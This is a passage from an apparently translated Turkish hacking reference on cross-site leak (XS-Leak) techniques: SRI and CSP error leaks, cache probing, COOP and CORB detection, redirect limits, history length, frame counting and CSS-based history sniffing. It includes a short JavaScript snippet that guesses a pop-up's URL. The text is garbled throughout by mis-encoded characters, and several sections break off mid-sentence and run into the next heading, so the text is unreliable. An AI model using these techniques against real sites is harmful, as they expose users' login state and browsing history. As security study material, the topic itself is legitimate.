Bir saldÄ±rgan, ayrÄ±ntÄ±lÄ± hata mesajlarÄ±nÄ± kullanarak cross-origin yanÄ±tlarÄ±n boyutunu Ã§Ä±karabilir. Bu, Subresource Integrity (SRI) mekanizmasÄ±nÄ±n, genellikle CDN'lerden alÄ±nan kaynaklarÄ±n deÄŸiÅŸtirilmediÄŸini doÄŸrulamak iÃ§in bÃ¼tÃ¼nlÃ¼k Ã¶zniteliÄŸini kullandÄ±ÄŸÄ±ndan mÃ¼mkÃ¼ndÃ¼r. SRI'nin cross-origin kaynaklarda Ã§alÄ±ÅŸabilmesi iÃ§in bunlarÄ±n **CORS etkin** olmasÄ± gerekir; aksi takdirde bÃ¼tÃ¼nlÃ¼k kontrolÃ¼ne tabi tutulmazlar. GÃ¼venlik Ä°ddialarÄ± (SA) iÃ§inde, CORS hata XS-Leak gibi, bir bÃ¼tÃ¼nlÃ¼k Ã¶zniteliÄŸi iÃ§eren bir fetch isteÄŸi sonrasÄ±nda bir hata mesajÄ± yakalanabilir. SaldÄ±rganlar, herhangi bir isteÄŸin bÃ¼tÃ¼nlÃ¼k Ã¶zniteliÄŸine **sahte bir karma deÄŸeri** atayarak bu hatayÄ± kasÄ±tlÄ± olarak tetikleyebilir. SA'da, ortaya Ã§Ä±kan hata mesajÄ± istenen kaynaÄŸÄ±n iÃ§erik uzunluÄŸunu yanlÄ±ÅŸlÄ±kla ortaya Ã§Ä±karÄ±r. Bu bilgi sÄ±zÄ±ntÄ±sÄ±, bir saldÄ±rganÄ±n yanÄ±t boyutundaki farklÄ±lÄ±klarÄ± ayÄ±rt etmesine olanak tanÄ±r ve sofistike XS-Leak saldÄ±rÄ±larÄ± iÃ§in yol aÃ§ar.

### CSP Ä°hlali/Tespiti

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Ã–zet:** CSP'de sadece hedef web sitesine izin verildiÄŸinde, CSP fark edilebilir bir hataya neden olur.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak cross-origin bir sitenin farklÄ± bir kÃ¶k siteye yÃ¶nlendirilip yÃ¶nlendirilmediÄŸini tespit edebilir. Bu sÄ±zÄ±ntÄ± yÃ¶nlendirmeyi tespit edebilir, ancak ayrÄ±ca yÃ¶nlendirme hedefinin alan adÄ± da sÄ±zar. Bu saldÄ±rÄ±nÄ±n temel fikri, saldÄ±rgan sitesinde hedef alan adÄ±na izin vermektedir. Bir istek hedef alan adÄ±na gÃ¶nderildiÄŸinde, bu alan adÄ± cross-origin bir etki alanÄ±na yÃ¶nlendirilir. CSP, buna eriÅŸimi engeller ve bir sÄ±zÄ±ntÄ± tekniÄŸi olarak kullanÄ±lan bir ihlal raporu oluÅŸturur. TarayÄ±cÄ±ya baÄŸlÄ± olarak, bu rapor yÃ¶nlendirmenin hedef konumunu sÄ±zdÄ±rabilir. Modern tarayÄ±cÄ±lar yÃ¶nlendirildiÄŸi URL'yi belirtmese de, hala bir cross-origin yÃ¶nlendirme tetiklendiÄŸini tespit edebilirsiniz.

### Ã–nbellek

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Ã–zet:** Ã–nbellekten dosyayÄ± temizleyin. Hedef sayfayÄ± aÃ§Ä±n ve dosyanÄ±n Ã¶nbellekte olup olmadÄ±ÄŸÄ±nÄ± kontrol edin.
* **Ã–rnek Kod:**

TarayÄ±cÄ±lar tÃ¼m web siteleri iÃ§in paylaÅŸÄ±lan bir Ã¶nbellek kullanabilir. KÃ¶kenlerinden baÄŸÄ±msÄ±z olarak, bir hedef sayfanÄ±n belirli bir dosyayÄ± **isteyip istemediÄŸi** Ã§Ä±karÄ±labilir.

Bir sayfa, kullanÄ±cÄ± giriÅŸ yaptÄ±ÄŸÄ±nda yalnÄ±zca bir resmi yÃ¼klerse, **kaynaÄŸÄ± geÃ§ersiz kÄ±labilirsiniz** (eÄŸer Ã¶nbellekteyse artÄ±k Ã¶nbellekte olmaz, daha fazla bilgi iÃ§in baÄŸlantÄ±lara bakÄ±n), bu kaynaÄŸÄ± yÃ¼kleyebilecek bir isteÄŸi gerÃ§ekleÅŸtirin ve kaynaÄŸÄ± **hatalÄ± bir istekle yÃ¼klemeye Ã§alÄ±ÅŸÄ±n** (Ã¶rneÄŸin, aÅŸÄ±rÄ± uzun bir referer baÅŸlÄ±ÄŸÄ± kullanarak). Kaynak yÃ¼klemesi **herhangi bir hata tetiklemediyse**, bu kaynak **Ã¶nbellekte** olduÄŸu anlamÄ±na gelir.

### CSP YÃ¶nergesi

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Ã–zet:** CSP baÅŸlÄ±k yÃ¶nergeleri, CSP iframe Ã¶zniteliÄŸini kullanarak sÄ±zan politika ayrÄ±ntÄ±larÄ±nÄ± ortaya Ã§Ä±karabilir.
* **Ã–rnek Kod**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'da (GC) yeni bir Ã¶zellik, web sayfalarÄ±nÄ±n bir iframe Ã¶ÄŸesine bir Ã¶znitelik atayarak bir Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) Ã¶nermesine izin
### CORB

* **Dahil Etme YÃ¶ntemleri**: HTML Elementleri
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±klar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Ã–zet**: CORB saldÄ±rganlara istekte **`nosniff` baÅŸlÄ±ÄŸÄ±nÄ±n varlÄ±ÄŸÄ±nÄ±** tespit etme imkanÄ± saÄŸlayabilir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

SaldÄ±rÄ± hakkÄ±nda daha fazla bilgi iÃ§in baÄŸlantÄ±yÄ± kontrol edin.

### CORS hatasÄ± Origin Reflection yanlÄ±sÄ± yapÄ±landÄ±rmada <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±klar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Ã–zet**: EÄŸer Origin baÅŸlÄ±ÄŸÄ± `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nda yansÄ±tÄ±lÄ±yorsa, bir kaynaÄŸÄ±n Ã¶nbellekte olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

EÄŸer Origin baÅŸlÄ±ÄŸÄ± `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nda yansÄ±tÄ±lÄ±yorsa, bir saldÄ±rgan bu davranÄ±ÅŸÄ± istismar ederek kaynaÄŸÄ± CORS modunda almaya Ã§alÄ±ÅŸabilir. EÄŸer bir hata tetiklenmezse, kaynaÄŸÄ±n web'den doÄŸru bir ÅŸekilde alÄ±ndÄ±ÄŸÄ± anlamÄ±na gelir. EÄŸer bir hata tetiklenirse, bu kaynaÄŸÄ±n Ã¶nbellekten eriÅŸildiÄŸi anlamÄ±na gelir (hata, Ã¶nbelleÄŸe CORS baÅŸlÄ±ÄŸÄ±yla orijinal alan adÄ±nÄ± ve saldÄ±rganÄ±n alan adÄ±nÄ± izin veren bir yanÄ±tÄ± kaydederken oluÅŸur).\
UnutulmamalÄ±dÄ±r ki, eÄŸer origin yansÄ±tÄ±lmÄ±yorsa ancak joker karakteri kullanÄ±lÄ±yorsa (`Access-Control-Allow-Origin: *`), bu yÃ¶ntem Ã§alÄ±ÅŸmayacaktÄ±r.

## Okunabilir Ã–znitelik TekniÄŸi

### Fetch YÃ¶nlendirmesi

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Ã–zet**: GC ve SA, yÃ¶nlendirme tamamlandÄ±ktan sonra yanÄ±tÄ±n tÃ¼rÃ¼nÃ¼ (opaque-redirect) kontrol etmeye olanak saÄŸlar.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Fetch API kullanarak `redirect: "manual"` ve diÄŸer parametrelerle bir istek gÃ¶ndererek, `response.type` Ã¶zniteliÄŸini okumak mÃ¼mkÃ¼ndÃ¼r ve eÄŸer bu Ã¶znitelik `opaqueredirect` ile eÅŸitse, yanÄ±t bir yÃ¶nlendirmedir.

### COOP

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Ã–zet**: Cross-Origin Opener Policy (COOP) tarafÄ±ndan korunan sayfalar, Ã§apraz kÃ¶ken etkileÅŸimlerden eriÅŸimi engeller.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldÄ±rgan, Ã§apraz kÃ¶kenli bir HTTP yanÄ±tÄ±nda Cross-Origin Opener Policy (COOP) baÅŸlÄ±ÄŸÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± Ã§Ä±karabilir. COOP, web uygulamalarÄ± tarafÄ±ndan harici sitelerin keyfi pencere referanslarÄ±na eriÅŸmesini engellemek iÃ§in kullanÄ±lÄ±r. Bu baÅŸlÄ±ÄŸÄ±n gÃ¶rÃ¼nÃ¼rlÃ¼ÄŸÃ¼, **`contentWindow` referansÄ±na** eriÅŸmeye Ã§alÄ±ÅŸarak tespit edilebilir. COOP koÅŸullu olarak uygulandÄ±ÄŸÄ±nda, **`opener` Ã¶zelliÄŸi** bir ipucu olur: COOP aktif olduÄŸunda **tanÄ±mlanmamÄ±ÅŸ** olurken, yokluÄŸunda **tanÄ±mlanÄ±r**.

### URL Maksimum UzunluÄŸu - Sunucu TarafÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API, HTML Elementleri
* **AlgÄ±lanabilir Fark**: Durum Kodu / Ä°Ã§erik
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Ã–zet**: YÃ¶nlendirme yanÄ±tÄ±nÄ±n uzunluÄŸu nedeniyle yanÄ±tlar arasÄ±ndaki farklarÄ± tespit etmek mÃ¼mkÃ¼ndÃ¼r, Ã§Ã¼nkÃ¼ sunucu bir hata ile yanÄ±t verir ve bir uyarÄ± oluÅŸturulur.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

EÄŸer sunucu tarafÄ±nda bir yÃ¶nlendirme, **yÃ¶nlendirmede kullanÄ±cÄ± giriÅŸi** ve **ekstra veri** kullanÄ±yorsa, bu davranÄ±ÅŸÄ± tespit etmek mÃ¼mkÃ¼ndÃ¼r Ã§Ã¼nkÃ¼ genellikle **sunucularÄ±n bir istek uzunluk sÄ±nÄ±rÄ±** vardÄ±r. EÄŸer **kullanÄ±cÄ± verisi** bu **uzunluÄŸa - 1** eÅŸitse, Ã§Ã¼nkÃ¼ **yÃ¶nlendirme** bu veriyi kullanÄ±yor ve **ekstra bir ÅŸey ekliyor**, bu **Hata OlaylarÄ±** aracÄ±lÄ±ÄŸÄ±yla tespit edilebilen bir **hata tetiklenir**.

EÄŸer bir kullanÄ±cÄ±ya Ã§erezler atayabilirseniz, bu saldÄ±rÄ±yÄ± **yeterli sayÄ±da Ã§erez atayarak** da gerÃ§ekleÅŸtirebilirsiniz ([**cookie bombasÄ±**](hacking-with-cookies/cookie-bomb.md)). Bu durumda, doÄŸru yanÄ±tÄ±n **boyutu arttÄ±ÄŸÄ±nda** bir **hata** tetiklenir. Bu durumda, hatayÄ± kontrol etmek iÃ§in aynÄ± site Ã¼zerinden bu isteÄŸi tetiklerseniz, `<script>` otomatik olarak Ã§erezleri gÃ¶nderir.\
**Ã‡erez bombasÄ± + XS-Search** Ã¶rneÄŸi, bu yazÄ±nÄ±n Ä°stenmeyen Ã§Ã¶zÃ¼mÃ¼nde bulunabilir: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Bu tÃ¼r bir saldÄ±rÄ± iÃ§in genellikle `SameSite=None` veya aynÄ± baÄŸlamda olmak gereklidir.

### URL Maksimum UzunluÄŸu - Ä°stemci TarafÄ±

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Durum Kodu / Ä°Ã§erik
* **Daha Fazla Bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-
### Maksimum YÃ¶nlendirmeler

* **Dahil Etme YÃ¶ntemleri**: Fetch API, Frames
* **Tespit Edilebilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Ã–zet:** TarayÄ±cÄ±nÄ±n yÃ¶nlendirme sÄ±nÄ±rÄ±nÄ± kullanarak URL yÃ¶nlendirmelerinin gerÃ§ekleÅŸip gerÃ§ekleÅŸmediÄŸini belirleyin.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

EÄŸer bir tarayÄ±cÄ±nÄ±n takip edeceÄŸi **maksimum** yÃ¶nlendirme sayÄ±sÄ± **20** ise, bir saldÄ±rgan kendi sayfasÄ±nÄ± **19 yÃ¶nlendirme** ile yÃ¼klemeyi deneyebilir ve sonunda **kurbanÄ±** test edilen sayfaya **yÃ¶nlendirebilir**. EÄŸer bir **hata** tetiklenirse, o zaman sayfa kurbanÄ± **yÃ¶nlendirmeye Ã§alÄ±ÅŸÄ±yordu**.

### GeÃ§miÅŸ UzunluÄŸu

* **Dahil Etme YÃ¶ntemleri**: Frames, Pop-uplar
* **Tespit Edilebilir Fark**: YÃ¶nlendirmeler
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Ã–zet:** JavaScript kodu tarayÄ±cÄ± geÃ§miÅŸini manipÃ¼le edebilir ve uzunluk Ã¶zelliÄŸi ile eriÅŸilebilir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**GeÃ§miÅŸ API'si**, JavaScript kodunun tarayÄ±cÄ± geÃ§miÅŸini manipÃ¼le etmesine izin verir, bu da bir kullanÄ±cÄ±nÄ±n ziyaret ettiÄŸi sayfalarÄ± **kaydeder**. Bir saldÄ±rgan, dahil etme yÃ¶ntemi olarak uzunluk Ã¶zelliÄŸini kullanabilir: JavaScript ve HTML gezinmesini tespit etmek iÃ§in.\
**`history.length`'i kontrol ederek**, bir kullanÄ±cÄ±nÄ±n bir sayfaya **gezinmesini saÄŸlayarak**, onu **aynÄ± kÃ¶k URL'ye geri deÄŸiÅŸtirerek** ve **`history.length`**'in yeni deÄŸerini **kontrol ederek**.

### AynÄ± URL ile GeÃ§miÅŸ UzunluÄŸu

* **Dahil Etme YÃ¶ntemleri**: Frames, Pop-uplar
* **Tespit Edilebilir Fark**: URL, tahmin edilen URL ile aynÄ± mÄ±
* **Ã–zet:** GeÃ§miÅŸ uzunluÄŸunu kÃ¶tÃ¼ye kullanarak bir Ã§erÃ§eve/pop-up'Ä±n konumunun belirli bir URL'de olup olmadÄ±ÄŸÄ±nÄ± tahmin etmek mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã–rneÄŸi**: AÅŸaÄŸÄ±da

Bir saldÄ±rgan, JavaScript kodunu kullanarak **Ã§erÃ§eve/pop-up konumunu tahmin edilen bir URL'ye manipÃ¼le edebilir** ve **hemen** **`about:blank`'e deÄŸiÅŸtirebilir**. EÄŸer geÃ§miÅŸ uzunluÄŸu artarsa, bu URL'nin doÄŸru olduÄŸu ve **artma zamanÄ± olduÄŸu anlamÄ±na gelir Ã§Ã¼nkÃ¼ URL aynÄ±ysa yeniden yÃ¼klenmez**. EÄŸer artmazsa, o zaman **tahmin edilen URL'yi yÃ¼klemeye Ã§alÄ±ÅŸtÄ±** ama biz **hemen sonra** **`about:blank`'i yÃ¼klediÄŸimiz iÃ§in**, geÃ§miÅŸ uzunluÄŸu tahmin edilen URL'yi yÃ¼klerken hiÃ§bir zaman artmadÄ±.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame SayÄ±mÄ±

* **Dahil Etme YÃ¶ntemleri**: Frame'ler, Pop-up'lar
* **Tespit Edilebilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Ã–zet:** `window.length` Ã¶zelliÄŸini inceleyerek iframe elemanlarÄ±nÄ±n sayÄ±sÄ±nÄ± deÄŸerlendirin.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` veya `window.open` ile aÃ§Ä±lan bir web sayfasÄ±ndaki **frame sayÄ±sÄ±nÄ± saymak**, kullanÄ±cÄ±nÄ±n o sayfadaki **durumunu belirlemeye yardÄ±mcÄ± olabilir**.\
AyrÄ±ca, sayfanÄ±n her zaman aynÄ± sayÄ±da frame'e sahip olmasÄ± durumunda, frame sayÄ±sÄ±nÄ± **sÃ¼rekli olarak kontrol etmek**, bilgi sÄ±zdÄ±rabilecek bir **desen**i belirlemeye yardÄ±mcÄ± olabilir.

Bu tekniÄŸin bir Ã¶rneÄŸi, Chrome'da bir **PDF**'nin **frame sayÄ±mÄ±** ile tespit edilebilir Ã§Ã¼nkÃ¼ dahili olarak bir `embed` kullanÄ±lÄ±r. Bu tekniÄŸin ilginÃ§ olabileceÄŸi `zoom`, `view`, `page`, `toolbar` gibi bazÄ± iÃ§erik Ã¼zerinde kontrol saÄŸlayan [AÃ§Ä±k URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) bulunmaktadÄ±r.

### HTMLElements

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **Tespit Edilebilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Ã–zet:** SÄ±zan deÄŸeri okuyarak 2 olasÄ± durum arasÄ±nda ayrÄ±m yapÄ±n
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML elemanlarÄ± aracÄ±lÄ±ÄŸÄ±yla bilgi sÄ±zÄ±ntÄ±sÄ±, Ã¶zellikle kullanÄ±cÄ± bilgilerine dayalÄ± olarak dinamik medya dosyalarÄ± oluÅŸturulduÄŸunda veya medya boyutunu deÄŸiÅŸtiren filigranlar eklendiÄŸinde web gÃ¼venliÄŸinde bir endiÅŸe oluÅŸturur. SaldÄ±rganlar, belirli HTML elemanlarÄ± tarafÄ±ndan ortaya Ã§Ä±karÄ±lan bilgilere dayanarak olasÄ± durumlar arasÄ±nda ayrÄ±m yapmak iÃ§in bunu kullanabilir.

### HTML ElemanlarÄ± TarafÄ±ndan Ortaya Ã‡Ä±karÄ±lan Bilgiler

- **HTMLMediaElement**: Bu eleman, medyanÄ±n `duration` ve `buffered` sÃ¼relerini, API'sÄ± aracÄ±lÄ±ÄŸÄ±yla eriÅŸilebilir hale getirir.
[HTMLMediaElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: `videoHeight` ve `videoWidth` Ã¶zelliklerini ortaya Ã§Ä±karÄ±r. BazÄ± tarayÄ±cÄ±larda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek Ã¶zellikler mevcuttur ve medya iÃ§eriÄŸi hakkÄ±nda daha detaylÄ± bilgi sunar.
[HTMLVideoElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Bu iÅŸlev, video oynatma kalitesi hakkÄ±nda ayrÄ±ntÄ±lar saÄŸlar ve iÅŸlenen video veri miktarÄ±nÄ± gÃ¶sterebilen `totalVideoFrames` Ã¶zelliÄŸini iÃ§erir.
[getVideoPlaybackQuality() hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Bu eleman, bir resmin `height` ve `width` deÄŸerlerini sÄ±zdÄ±rÄ±r. Ancak, bir resim geÃ§ersiz ise, bu Ã¶zellikler 0 olarak dÃ¶ner ve `image.decode()` iÅŸlevi reddedilir, bÃ¶ylece resmin dÃ¼zgÃ¼n bir ÅŸekilde yÃ¼klenemediÄŸi belirtilir.
[HTMLImageElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)


### CSS Ã–zelliÄŸi

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **Tespit Edilebilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Ã–zet:** KullanÄ±cÄ±nÄ±n durumu veya durumuyla iliÅŸkili web sitesi stilindeki deÄŸiÅŸiklikleri belirleyin.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamalarÄ±, kullanÄ±cÄ±nÄ±n durumuna baÄŸlÄ± olarak **web sitesi stilini deÄŸiÅŸtirebilir**. Ã‡apraz kÃ¶kenli CSS dosyalarÄ±, **HTML link elemanÄ±** ile saldÄ±rgan sayfaya gÃ¶mÃ¼lebilir ve **kurallar** saldÄ±rgan sayfaya **uygulanÄ±r**. Bir sayfa bu kurallarÄ± dinamik olarak deÄŸiÅŸtiriyorsa, bir saldÄ±rgan kullanÄ±cÄ± durumuna baÄŸlÄ± olarak bu farklarÄ± **tespit** edebilir.\
Bir sÄ±zÄ±ntÄ± tekniÄŸi olarak, saldÄ±rgan, etkilenen elemanÄ±n ve Ã¶zellik adÄ±nÄ±n bilindiÄŸi takdirde, `window.getComputedStyle` yÃ¶ntemini kullanarak belirli bir HTML elemanÄ±nÄ±n CSS Ã¶zelliklerini **okuyabilir**. SonuÃ§ olarak, bir saldÄ±rgan etkilenen elemanÄ±n herhangi bir CSS Ã¶zelliÄŸini okuyabilir.

### CSS GeÃ§miÅŸi

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **Tespit Edilebilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Ã–zet:** `:visited` stilinin bir URL'ye uygulandÄ±ÄŸÄ±nÄ± tespit ederek daha Ã¶nce ziyaret edildiÄŸini belirleyin
* **Kod Ã–rneÄŸi**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**Burada**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) belirtildiÄŸine gÃ¶re, bu headless Chrome'da Ã§alÄ±ÅŸmamaktadÄ±r.
{% endhint %}

CSS `:visited` seÃ§icisi, kullanÄ±cÄ± tarafÄ±ndan daha Ã¶nce ziyaret edilen URL'leri farklÄ± ÅŸekilde biÃ§imlendirmek iÃ§in kullanÄ±lÄ±r. GeÃ§miÅŸte, `getComputedStyle()` yÃ¶ntemi bu stil farklarÄ±nÄ± belirlemek iÃ§in kullanÄ±labilirdi. Ancak, modern tarayÄ±cÄ±lar, bu yÃ¶ntemin bir baÄŸlantÄ±nÄ±n durumunu ortaya Ã§Ä±karmasÄ±nÄ± Ã¶nlemek iÃ§in gÃ¼venlik Ã¶nlemleri uygulamÄ±ÅŸtÄ±r. Bu Ã¶nlemler, her zaman baÄŸlantÄ±nÄ±n ziyaret edilmiÅŸ gibi hesaplanmÄ±ÅŸ stilini dÃ¶ndÃ¼rmek ve `:visited` seÃ§icisi ile uygulanabilecek stilleri sÄ±nÄ±rlamak gibi ÅŸeyleri iÃ§erir.

Bu kÄ±sÄ±tlamalara raÄŸmen, bir baÄŸlantÄ±nÄ±n ziyaret edilmiÅŸ durumunu dolaylÄ± olarak belirlemek mÃ¼mkÃ¼ndÃ¼r. Bir teknik, kullanÄ±cÄ±yÄ± CSS tarafÄ±ndan etkilenen bir alana etkileÅŸimde bulunmaya kandÄ±rmakla ilgilidir, Ã¶zellikle `mix-blend-mode` Ã¶zelliÄŸini kullanarak. Bu Ã¶zellik, Ã¶ÄŸelerin arka planlarÄ±yla karÄ±ÅŸtÄ±rÄ±lmasÄ±na izin verir ve kullanÄ±cÄ± etkileÅŸimine baÄŸlÄ± olarak ziyaret edilmiÅŸ durumu ortaya Ã§Ä±karabilir.

AyrÄ±ca, kullanÄ±cÄ± etkileÅŸimi olmaksÄ±zÄ±n da tespit gerÃ§ekleÅŸtirilebilir, baÄŸlantÄ±larÄ±n render sÃ¼releri sÃ¶mÃ¼rÃ¼lerek. TarayÄ±cÄ±lar ziyaret edilmiÅŸ ve edilmemiÅŸ baÄŸlantÄ±larÄ± farklÄ± ÅŸekilde render edebileceÄŸinden, bu, render sÃ¼res
### ContentDocument X-Frame SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±klar
* **Daha fazla bilgi**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
